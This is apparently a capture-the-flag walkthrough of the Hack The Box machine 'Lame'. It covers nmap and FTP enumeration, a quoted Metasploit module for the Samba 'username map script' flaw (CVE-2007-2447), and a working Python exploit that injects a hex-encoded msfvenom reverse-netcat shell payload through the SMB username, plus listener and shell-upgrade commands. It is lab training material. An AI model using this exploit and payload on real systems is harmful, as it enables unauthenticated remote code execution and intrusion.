# Hack The Box - Lame Walkthrough without Metasploit

## Enumeration
First we start by running nmap against the target
```nmap
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Lame]
└─$ nmap -sC -sV -A -oN nmap 10.10.10.3 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 10:08 EST
Nmap scan report for 10.10.10.3
Host is up (0.14s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-01-07T10:09:22-05:00
|_clock-skew: mean: 2h30m39s, deviation: 3h32m10s, median: 37s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.87 seconds

```

Since `FTP` port is open and seems to allow `Anonymous` login we will try to log in and see if we can find anything.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Lame]
└─$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:darshan): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||57000|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||13084|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||48290|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> 

```
We found nothing there, next thing we can see in our initial enumeration is that Samba is running with version 3.0.20-Debian, with a fast google search we will find that it is vulnerable to a [Remote Heap Overflow](https://www.exploit-db.com/exploits/16320)

```ruby
##
# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::SMB

	# For our customized version of session_setup_ntlmv1
	CONST = Rex::Proto::SMB::Constants
	CRYPT = Rex::Proto::SMB::Crypt

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Samba "username map script" Command Execution',
			'Description'    => %q{
					This module exploits a command execution vulerability in Samba
				versions 3.0.20 through 3.0.25rc3 when using the non-default
				"username map script" configuration option. By specifying a username
				containing shell meta characters, attackers can execute arbitrary
				commands.

				No authentication is needed to exploit this vulnerability since
				this option is used to map usernames prior to authentication!
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10040 $',
			'References'     =>
				[
					[ 'CVE', '2007-2447' ],
					[ 'OSVDB', '34700' ],
					[ 'BID', '23972' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
					[ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => true, # root or nobody user
			'Payload'        =>
				{
					'Space'    => 1024,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							# *_perl and *_ruby work if they are installed
							# mileage may vary from system to system..
						}
				},
			'Targets'        =>
				[
					[ "Automatic", { } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'May 14 2007'))

		register_options(
			[
				Opt::RPORT(139)
			], self.class)
	end


	def exploit

		connect

		# lol?
		username = "/=`nohup " + payload.encoded + "`"
		begin
			simple.client.negotiate(false)
			simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
		rescue ::Timeout::Error, XCEPT::LoginError
			# nothing, it either worked or it didn't ;)
		end

		handler
	end

end
```

But that is a Metasploit module and we want to do it without it... if we read the exploit it says that its exploiting a vulnerability by __specifying a username containing shell meta characters__, executing commands... and __no authentication is needed__ to exploit this vulnerability, with this information we can make our python script to exploit this `samba` version.

## Exploitation
> Creating the script

This is the skeleton of the `python` script we will use to exploit this `Samba` version: 
```python
#!/usr/bin/python3
#Samba 3.0.20-Debian
from smb import *
from smb.SMBConnection import *

#msfvenom -p cmd/unix/reverse_netcat LHOST=<Attacker-IP> LPORT=<Attacker-Port> -f python
payload =("");

userID = "/=` nohup " + payload + "`"
password = 'evil'
ip = '10.10.10.3'

conn = SMBConnection(userID, password,"some","thing", use_ntlm_v2=False)
conn.connect(ip, 445)
```

> Creating the Payload
For the payload we will use msfvenom to create a reverse shell that we will capture with netcat:
```
msfvenom -p cmd/unix/reverse_netcat LHOST=<Attacker-IP> LPORT=<Attacker-Port> -f python
```
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Lame]
└─$ msfvenom -p cmd/unix/reverse_netcat LHOST=<My IP> LPORT=4444 -f python
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 100 bytes
Final size of python file: 499 bytes
buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b"
buf += b"\x6d\x71\x74\x67\x68\x68\x3b\x20\x6e\x63\x20\x31\x30"
buf += b"\x2e\x31\x30\x2e\x31\x34\x2e\x32\x20\x34\x34\x34\x34"
buf += b"\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x6b\x6d\x71\x74\x67"
buf += b"\x68\x68\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20"
buf += b"\x3e\x2f\x74\x6d\x70\x2f\x6b\x6d\x71\x74\x67\x68\x68"
buf += b"\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d"
buf += b"\x70\x2f\x6b\x6d\x71\x74\x67\x68\x69"
```

---
> Putting everything together
```python
#!/usr/bin/python3
#Samba 3.0.20-Debian
from smb import *
from smb.SMBConnection import *

#msfvenom -p cmd/unix/reverse_netcat LHOST=<Attacker-IP> LPORT=<Attacker-Port> -f python
payload =("\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b"
				"\x6d\x71\x74\x67\x68\x68\x3b\x20\x6e\x63\x20\x31\x30"
				"\x2e\x31\x30\x2e\x31\x34\x2e\x32\x20\x34\x34\x34\x34"
				"\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x6b\x6d\x71\x74\x67"
				"\x68\x68\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20"
				"\x3e\x2f\x74\x6d\x70\x2f\x6b\x6d\x71\x74\x67\x68\x68"
				"\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d"
				"\x70\x2f\x6b\x6d\x71\x74\x67\x68\x62");

userID = "/=` nohup " + payload + "`"
password = 'evil'
ip = '10.10.10.3'

conn = SMBConnection(userID, password,"some","thing", use_ntlm_v2=False)
conn.connect(ip, 445)
```

Now we start a listener on another shell
```
nc -lvnp 4444
```

We might run into an error while executing the script & in order to fix it we have to install the following python module if we are missing it:
```python
pip3 install pysmb
```

Now we can run it again.. and if we have our listener ready we should be able to get a shell back

## Pwnd
We got a shell back, the first thing we look for is to make it interactive, for that matter we will see if the machine has python with

```
which python
```

In this particular case that will be enought, we can use the following command to spawn an interactive shell
```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

Now we can grab our flag ;)
